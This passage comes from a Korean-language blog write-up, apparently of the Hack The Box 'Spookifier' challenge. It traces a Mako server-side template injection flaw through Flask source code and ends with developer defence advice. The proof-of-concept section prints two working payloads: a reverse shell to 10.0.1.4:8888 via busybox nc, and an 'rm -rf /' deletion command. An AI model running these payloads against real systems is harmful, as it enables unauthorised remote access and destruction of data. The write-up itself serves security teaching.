+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="k">[supervisord]</span>
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="na">user</span><span class="o">=</span><span class="s">root</span>
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="na">nodaemon</span><span class="o">=</span><span class="s">true</span>
+<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="na">logfile</span><span class="o">=</span><span class="s">/dev/null</span>
+<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="na">logfile_maxbytes</span><span class="o">=</span><span class="s">0</span>
+<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="na">pidfile</span><span class="o">=</span><span class="s">/run/supervisord.pid</span>
+<a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>
+<a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a><span class="k">[program:flask]</span>
+<a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a><span class="na">command</span><span class="o">=</span><span class="s">python /app/run.py</span>
+<a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a><span class="na">autorestart</span><span class="o">=</span><span class="s">true</span>
+<a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a><span class="na">stdout_logfile</span><span class="o">=</span><span class="s">/dev/stdout</span>
+<a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a><span class="na">stdout_logfile_maxbytes</span><span class="o">=</span><span class="s">0</span>
+<a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a><span class="na">stderr_logfile</span><span class="o">=</span><span class="s">/dev/stderr</span>
+<a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a><span class="na">stderr_logfile_maxbytes</span><span class="o">=</span><span class="s">0</span>
+</code></pre></div>
+<h4 id="_3">소스코드 분석</h4>
+<h6 id="runpy">run.py</h6>
+<p>본격적으로 소스코드 분석을 해보겠습니다. run.py를 살펴보겠습니다. <code>1337</code>포트를 통해 앱서비스를 실행하고 있고 <code>use_evalex</code>, <code>debug</code> 파라미터가 무슨 역할을 하는지 살펴보니 <a href="https://tedboy.github.io/flask/generated/generated/flask.Flask.run.html">debug 모드를 비활성화 하는 옵션</a>이라고 합니다. 위에서 봤던 Werkzeug 패키지를 이용한 공격은 할 수 없겠네요.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="kn">from</span><span class="w"> </span><span class="nn">application.main</span><span class="w"> </span><span class="kn">import</span> <span class="n">app</span>
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">1337</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">use_evalex</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</code></pre></div>
+<h6 id="mainpy">main.py</h6>
+<p>이제 main.py 쪽을 살펴봅시다. <code>response</code> 함수는 클라이언트 오류를 처리하기 위해 jsonify로 역직렬화 하는 것으로 보이고, <code>application.blueprints.routes</code>의 web 변수에 실제 처리하는 controller 코드로 추측됩니다. </p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="kn">from</span><span class="w"> </span><span class="nn">flask</span><span class="w"> </span><span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">jsonify</span>
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="kn">from</span><span class="w"> </span><span class="nn">application.blueprints.routes</span><span class="w"> </span><span class="kn">import</span> <span class="n">web</span>
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="kn">from</span><span class="w"> </span><span class="nn">flask_mako</span><span class="w"> </span><span class="kn">import</span> <span class="n">MakoTemplates</span>
+<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>
+<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+<a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="n">MakoTemplates</span><span class="p">(</span><span class="n">app</span><span class="p">)</span>
+<a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>
+<a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a><span class="k">def</span><span class="w"> </span><span class="nf">response</span><span class="p">(</span><span class="n">message</span><span class="p">):</span>
+<a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>    <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s1">&#39;message&#39;</span><span class="p">:</span> <span class="n">message</span><span class="p">})</span>
+<a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a>
+<a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a><span class="n">app</span><span class="o">.</span><span class="n">register_blueprint</span><span class="p">(</span><span class="n">web</span><span class="p">,</span> <span class="n">url_prefix</span><span class="o">=</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
+<a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a>
+<a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a><span class="nd">@app</span><span class="o">.</span><span class="n">errorhandler</span><span class="p">(</span><span class="mi">404</span><span class="p">)</span>
+<a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a><span class="k">def</span><span class="w"> </span><span class="nf">not_found</span><span class="p">(</span><span class="n">error</span><span class="p">):</span>
+<a id="__codelineno-3-15" name="__codelineno-3-15" href="#__codelineno-3-15"></a>    <span class="k">return</span> <span class="n">response</span><span class="p">(</span><span class="s1">&#39;404 Not Found&#39;</span><span class="p">),</span> <span class="mi">404</span>
+<a id="__codelineno-3-16" name="__codelineno-3-16" href="#__codelineno-3-16"></a>
+<a id="__codelineno-3-17" name="__codelineno-3-17" href="#__codelineno-3-17"></a><span class="nd">@app</span><span class="o">.</span><span class="n">errorhandler</span><span class="p">(</span><span class="mi">403</span><span class="p">)</span>
+<a id="__codelineno-3-18" name="__codelineno-3-18" href="#__codelineno-3-18"></a><span class="k">def</span><span class="w"> </span><span class="nf">forbidden</span><span class="p">(</span><span class="n">error</span><span class="p">):</span>
+<a id="__codelineno-3-19" name="__codelineno-3-19" href="#__codelineno-3-19"></a>    <span class="k">return</span> <span class="n">response</span><span class="p">(</span><span class="s1">&#39;403 Forbidden&#39;</span><span class="p">),</span> <span class="mi">403</span>
+<a id="__codelineno-3-20" name="__codelineno-3-20" href="#__codelineno-3-20"></a>
+<a id="__codelineno-3-21" name="__codelineno-3-21" href="#__codelineno-3-21"></a><span class="nd">@app</span><span class="o">.</span><span class="n">errorhandler</span><span class="p">(</span><span class="mi">400</span><span class="p">)</span>
+<a id="__codelineno-3-22" name="__codelineno-3-22" href="#__codelineno-3-22"></a><span class="k">def</span><span class="w"> </span><span class="nf">bad_request</span><span class="p">(</span><span class="n">error</span><span class="p">):</span>
+<a id="__codelineno-3-23" name="__codelineno-3-23" href="#__codelineno-3-23"></a>    <span class="k">return</span> <span class="n">response</span><span class="p">(</span><span class="s1">&#39;400 Bad Request&#39;</span><span class="p">),</span> <span class="mi">400</span>
+</code></pre></div>
+<h6 id="routespy">routes.py</h6>
+<p>이제 routes.py 입니다. API 확인 부분에서 에서 봤던 <code>?text=</code> 부분을 처리하는 함수 <code>index</code>가 있네요. <code>text</code> 값이 존재하면 <strong>spookify</strong> 함수를 거쳐 index.html에 렌더링 하는 것을 볼 수 있습니다.</p>
+<p><code>output</code> 파라미터에 converted를 설정하고 있는데 <a href="https://github.com/benselme/flask-mako/blob/afd736ada0cedce41880de1c78cad9d45363ee49/flask_mako.py#L240C1-L251C1">render_template</a> 함수를 조사해본 결과, output은 user가 직접 설정하는 값으로 확인되었습니다. 이걸 자세히 알려면 <code>index.html</code>파일 을 조사해 볼 필요가 있습니다.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="kn">from</span><span class="w"> </span><span class="nn">flask</span><span class="w"> </span><span class="kn">import</span> <span class="n">Blueprint</span><span class="p">,</span> <span class="n">request</span>
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="kn">from</span><span class="w"> </span><span class="nn">flask_mako</span><span class="w"> </span><span class="kn">import</span> <span class="n">render_template</span>
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="kn">from</span><span class="w"> </span><span class="nn">application.util</span><span class="w"> </span><span class="kn">import</span> <span class="n">spookify</span>
+<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>
+<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="n">web</span> <span class="o">=</span> <span class="n">Blueprint</span><span class="p">(</span><span class="s1">&#39;web&#39;</span><span class="p">,</span> <span class="vm">__name__</span><span class="p">)</span>
+<a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>
+<a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="nd">@web</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
+<a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a><span class="k">def</span><span class="w"> </span><span class="nf">index</span><span class="p">():</span>
+<a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a>    <span class="n">text</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;text&#39;</span><span class="p">)</span>
+<a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a>    <span class="k">if</span><span class="p">(</span><span class="n">text</span><span class="p">):</span>
+<a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a>        <span class="n">converted</span> <span class="o">=</span> <span class="n">spookify</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
+<a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a>        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">,</span><span class="n">output</span><span class="o">=</span><span class="n">converted</span><span class="p">)</span>
+<a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a>    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">,</span><span class="n">output</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
+</code></pre></div>
+<p><code>index.html</code>에는 아래처럼 <code>${output}</code>으로 지정되어 있는 곳에 converted 값이 세팅되는 것으로 분석됩니다.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>        <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;output&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>        <span class="p">&lt;</span><span class="nt">table</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;table table-bordered&quot;</span><span class="p">&gt;</span>
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>            <span class="p">&lt;</span><span class="nt">tbody</span><span class="p">&gt;</span>
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>                ${output} <span class="cm">&lt;!-- converted 값이 렌더링 하는 곳 --&gt;</span>
+<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>            <span class="p">&lt;/</span><span class="nt">tbody</span><span class="p">&gt;</span>
+<a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>        <span class="p">&lt;/</span><span class="nt">table</span><span class="p">&gt;</span>
+<a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a>        <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</code></pre></div>
+<h6 id="utilpy">util.py</h6>
+<p>이제 spookify 함수를 살펴보겠습니다. <code>util.py</code>내부에 <code>spookify</code> 가 들어있는데 내부적으로 <strong>호출하고 있는 <code>change_font</code>코드가 매우 복잡합니다.</strong> 그리고 <code>generate_render</code> 부분에서 저희가 응답값으로 봤던 틀(template)이 있는 것으로 보아 핵심 부분을 찾았습니다.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="kn">from</span><span class="w"> </span><span class="nn">mako.template</span><span class="w"> </span><span class="kn">import</span> <span class="n">Template</span>
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="k">def</span><span class="w"> </span><span class="nf">generate_render</span><span class="p">(</span><span class="n">converted_fonts</span><span class="p">):</span>
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>    <span class="n">result</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;</span>
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="s1">        &lt;tr&gt;</span>
+<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="s1">            &lt;td&gt;</span><span class="si">{0}</span><span class="s1">&lt;/td&gt;</span>
+<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="s1">        &lt;/tr&gt;</span>
+<a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a><span class="s1">        &lt;tr&gt;</span>
+<a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a><span class="s1">            &lt;td&gt;</span><span class="si">{1}</span><span class="s1">&lt;/td&gt;</span>
+<a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a><span class="s1">        &lt;/tr&gt;</span>
+<a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a><span class="s1">        &lt;tr&gt;</span>
+<a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a><span class="s1">            &lt;td&gt;</span><span class="si">{2}</span><span class="s1">&lt;/td&gt;</span>
+<a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a><span class="s1">        &lt;/tr&gt;</span>
+<a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a><span class="s1">        &lt;tr&gt;</span>
+<a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a><span class="s1">            &lt;td&gt;</span><span class="si">{3}</span><span class="s1">&lt;/td&gt;</span>
+<a id="__codelineno-6-15" name="__codelineno-6-15" href="#__codelineno-6-15"></a><span class="s1">        &lt;/tr&gt;</span>
+<a id="__codelineno-6-16" name="__codelineno-6-16" href="#__codelineno-6-16"></a><span class="s1">    &#39;&#39;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="o">*</span><span class="n">converted_fonts</span><span class="p">)</span>
+<a id="__codelineno-6-17" name="__codelineno-6-17" href="#__codelineno-6-17"></a>    <span class="k">return</span> <span class="n">Template</span><span class="p">(</span><span class="n">result</span><span class="p">)</span><span class="o">.</span><span class="n">render</span><span class="p">()</span>
+<a id="__codelineno-6-18" name="__codelineno-6-18" href="#__codelineno-6-18"></a>
+<a id="__codelineno-6-19" name="__codelineno-6-19" href="#__codelineno-6-19"></a><span class="k">def</span><span class="w"> </span><span class="nf">change_font</span><span class="p">(</span><span class="n">text_list</span><span class="p">):</span>
+<a id="__codelineno-6-20" name="__codelineno-6-20" href="#__codelineno-6-20"></a>    <span class="n">text_list</span> <span class="o">=</span> <span class="p">[</span><span class="o">*</span><span class="n">text_list</span><span class="p">]</span>
+<a id="__codelineno-6-21" name="__codelineno-6-21" href="#__codelineno-6-21"></a>    <span class="n">current_font</span> <span class="o">=</span> <span class="p">[]</span>
+<a id="__codelineno-6-22" name="__codelineno-6-22" href="#__codelineno-6-22"></a>    <span class="n">all_fonts</span> <span class="o">=</span> <span class="p">[]</span>
+<a id="__codelineno-6-23" name="__codelineno-6-23" href="#__codelineno-6-23"></a>    <span class="n">add_font_to_list</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="p">,</span><span class="n">font_type</span> <span class="p">:</span> <span class="p">(</span>
+<a id="__codelineno-6-24" name="__codelineno-6-24" href="#__codelineno-6-24"></a>        <span class="p">[</span><span class="n">current_font</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">globals</span><span class="p">()[</span><span class="n">font_type</span><span class="p">]</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="s1">&#39; &#39;</span><span class="p">))</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">text</span><span class="p">],</span> <span class="n">all_fonts</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">current_font</span><span class="p">)),</span> <span class="n">current_font</span><span class="o">.</span><span class="n">clear</span><span class="p">())</span> <span class="ow">and</span> <span class="kc">None</span>
+<a id="__codelineno-6-25" name="__codelineno-6-25" href="#__codelineno-6-25"></a>
+<a id="__codelineno-6-26" name="__codelineno-6-26" href="#__codelineno-6-26"></a>    <span class="n">add_font_to_list</span><span class="p">(</span><span class="n">text_list</span><span class="p">,</span> <span class="s1">&#39;font1&#39;</span><span class="p">)</span>
+<a id="__codelineno-6-27" name="__codelineno-6-27" href="#__codelineno-6-27"></a>    <span class="n">add_font_to_list</span><span class="p">(</span><span class="n">text_list</span><span class="p">,</span> <span class="s1">&#39;font2&#39;</span><span class="p">)</span>
+<a id="__codelineno-6-28" name="__codelineno-6-28" href="#__codelineno-6-28"></a>    <span class="n">add_font_to_list</span><span class="p">(</span><span class="n">text_list</span><span class="p">,</span> <span class="s1">&#39;font3&#39;</span><span class="p">)</span>
+<a id="__codelineno-6-29" name="__codelineno-6-29" href="#__codelineno-6-29"></a>    <span class="n">add_font_to_list</span><span class="p">(</span><span class="n">text_list</span><span class="p">,</span> <span class="s1">&#39;font4&#39;</span><span class="p">)</span>
+<a id="__codelineno-6-30" name="__codelineno-6-30" href="#__codelineno-6-30"></a>
+<a id="__codelineno-6-31" name="__codelineno-6-31" href="#__codelineno-6-31"></a>    <span class="k">return</span> <span class="n">all_fonts</span>
+<a id="__codelineno-6-32" name="__codelineno-6-32" href="#__codelineno-6-32"></a>
+<a id="__codelineno-6-33" name="__codelineno-6-33" href="#__codelineno-6-33"></a><span class="k">def</span><span class="w"> </span><span class="nf">spookify</span><span class="p">(</span><span class="n">text</span><span class="p">):</span>
+<a id="__codelineno-6-34" name="__codelineno-6-34" href="#__codelineno-6-34"></a>    <span class="n">converted_fonts</span> <span class="o">=</span> <span class="n">change_font</span><span class="p">(</span><span class="n">text_list</span><span class="o">=</span><span class="n">text</span><span class="p">)</span>
+<a id="__codelineno-6-35" name="__codelineno-6-35" href="#__codelineno-6-35"></a>    <span class="k">return</span> <span class="n">generate_render</span><span class="p">(</span><span class="n">converted_fonts</span><span class="o">=</span><span class="n">converted_fonts</span><span class="p">)</span>
+</code></pre></div>
+<h2 id="_4">원인은 어디에 있을까?</h2>
+<p>이 코드 안에 취약점이 있다는 건 바로 확인이 어려워 보입니다. 사용자가 입력한 문자열을 바탕으로 특수문자로 대응해 출력하는 구조인데, 사용자 입력 값을 변형해서 전달하는 것으로 해당 기능은 제 기능을 만족하고 있습니다.</p>
+<p>그런데 일반 텍스트를 출력하는 요구사항에 <code>generated_render</code> 함수를 보면 특이한 객체(Template)를 만들어서 반환합니다. 그냥 result를 반환하면 안되는 이유가 있을까요?</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="k">def</span><span class="w"> </span><span class="nf">generate_render</span><span class="p">(</span><span class="n">converted_fonts</span><span class="p">):</span>
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>    <span class="n">result</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;</span>
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="s1">        &lt;tr&gt;</span>
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="s1">            &lt;td&gt;</span><span class="si">{0}</span><span class="s1">&lt;/td&gt;</span>
+<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="s1">        &lt;/tr&gt;</span>
+<a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="s1">    &#39;&#39;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="o">*</span><span class="n">converted_fonts</span><span class="p">)</span>
+<a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a>    <span class="k">return</span> <span class="n">Template</span><span class="p">(</span><span class="n">result</span><span class="p">)</span><span class="o">.</span><span class="n">render</span><span class="p">()</span>
+</code></pre></div>
+<p>그래서 <a href="https://chatgpt.com/share/68087022-e214-8009-93c6-4eb17ff272b0">AI를 활용하여 템플릿 엔진 적용 장/단점들을 물어봤습니다</a>. 그러나 아래와 같은 답변을 하더군요. 요약하자면 아래와 같습니다.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>1.코드와 템플릿 분리:
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>    - HTML 구조와 파이썬 로직을 분리해 유지보수 용이.
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>
+<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>2.복잡한 템플릿 처리에 강함:
+<a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>    - 반복문, 조건문 등 복잡한 구조를 템플릿 내부에서 처리 가능.
+<a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>
+<a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>3. 자동 HTML 이스케이프:
+<a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a>    - 보안적인 측면에서 안전한 출력 처리 가능.
+<a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a>
+<a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a>4. 빠른 렌더링 성능:
+<a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a>    - 템플릿을 Python 코드로 컴파일해 빠르게 실행됨.
+<a id="__codelineno-8-12" name="__codelineno-8-12" href="#__codelineno-8-12"></a>
+<a id="__codelineno-8-13" name="__codelineno-8-13" href="#__codelineno-8-13"></a>5. 재사용성과 협업에 적합: 
+<a id="__codelineno-8-14" name="__codelineno-8-14" href="#__codelineno-8-14"></a>    - Jinja2 등 다른 템플릿 엔진과 유사한 문법으로 범용성 있음.
+</code></pre></div>
+<p>이 말만 전적으로 수용하면 Template를 써야하는 이유는 타당해 보입니다. Mako template은 <a href="https://docs.makotemplates.org/en/latest/syntax.html#expression-substitution">expression-substitution</a> 를 제공합니다.  그 중 인상적인 문구를 가져와 봤습니다.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>The contents within the `${}` tag are evaluated by Python directly, so full expressions are OK:
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>
+<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>pythagorean theorem:  ${pow(x,2) + pow(y,2)}
+<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>
+<a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>The results of the expression are evaluated into a string result in all cases before being rendered to the output stream, such as the above example where the expression produces a numeric result.
+</code></pre></div>
+<p>위의 내용에 따르면 <code>pow(x,2)</code>함수를 실행시켜 나온 결과를 바탕으로 렌더링 된다고 합니다. 여기서 생각해봐야 할 게 있습니다.</p>
+<blockquote>
+<p>만일 result가 불특정 다수가 요청한 임의의 문자열로 이루어지면 해당 값을 신뢰할 수 있을까? </p>
+</blockquote>
+<p>다시 result를 만드는 코드를 살펴보겠습니다.  converted_font에 만일 <code>${코드}</code>가 들어가면 어떻게 될까요? 맞습니다. mako template의 expression-substitution 기능으로 인해 <code>${}</code>안에 있는 코드가 실행되죠.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="n">result</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;</span>
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="s1">        &lt;tr&gt;</span>
+<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="s1">            &lt;td&gt;</span><span class="si">{0}</span><span class="s1">&lt;/td&gt;</span>
+<a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="s1">        &lt;/tr&gt;</span>
+<a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="s1">    &#39;&#39;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="o">*</span><span class="n">converted_fonts</span><span class="p">)</span>
+</code></pre></div>
+<h3 id="poc">Poc 작성</h3>
+<p>그럼 개념 증명을 해봅시다. Spookifier 페이지 기능에 <code>${1+1}</code>을 입력하여 결과 값을 살펴봅시다. 아래와 같이 2가 나타납니다. </p>
+<figure>
+<p><img alt="Image title" src="/fromitive-blog/assets/2025-04-23/HTB7.png" /></p>
+</figure>
+<p>클라이언트는 이제 임의의 코드를 실행 가능한 것을 확인할 수 있었습니다. 여기서 이제 어떤 공격을 할 수 있을까요? 아래의 코드를 입력하면 어떻게 될까요? </p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="err">$</span><span class="p">{</span><span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;busybox nc 10.0.1.4 8888 -e busybox sh&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}</span>
+</code></pre></div>
+<p>아님 이런 코드는 어때요?</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="err">$</span><span class="p">{</span><span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;rm -rf /&#39;</span><span class="p">)}</span>
+</code></pre></div>
+<p>위의 코드는 리눅스 시스템 명령어를 입력하여 <code>10.0.1.4의 8888</code>포트로 접속하여 sh 프로그램을 원격으로 실행시켜주는 <code>리버스 쉘</code> 공격 코드 입니다. 이를 활용하여 악의적인 사용자는 아래와 같이 운영 중인 서버에 정당한 인증 없이 직접 침투할 수 있게 됩니다. </p>
+<figure>
+<p><img alt="Image title" src="/fromitive-blog/assets/2025-04-23/HTB8.png" /></p>
+</figure>
+<h2 id="_5">그럼 어떻게 대응해야 할까?</h2>
+<p>이 글을 바탕으로, 개발 중 외부라이브러리의 기능을 제대로 파악하고 있지 않으면 발생할 수 있는 위협들을 함께 알아봤습니다. 하지만, 현실적으로 이런 기능들을 제대로 파악하는 건 어렵습니다. 취약점이 위와 같은 SSTI(Servier-Side-Template Injection)만 있는 것도 아니고, 위의 예시처럼 간단한 로직도 아닐겁니다. 개발자들은 어떻게 대응해야 할까요?</p>
+<h3 id="1">1. 사용자 입력 값을 신뢰하지 마세요</h3>
+<p>제안하고 싶은 건 불특정 다수의 입력 값들을 기본적으로 신뢰하지 않는다는 습관을 가져야 합니다. 사용자가 웹 브라우저나 앱을 통해 입력값을 전송한다고 가정하지 말아야합니다. 저희가 서버를 개발한 것과 같이 <strong>그들도 API를 직접 호출할 수 있고 필터링을 우회하는 값들을 언제든지 보낼 수 있다</strong>는 사실을 인지하고 있어야 합니다.</p>
+<h3 id="2_1">2. 만든 기능에 대한 실패 테스트 코드를 작성하세요</h3>
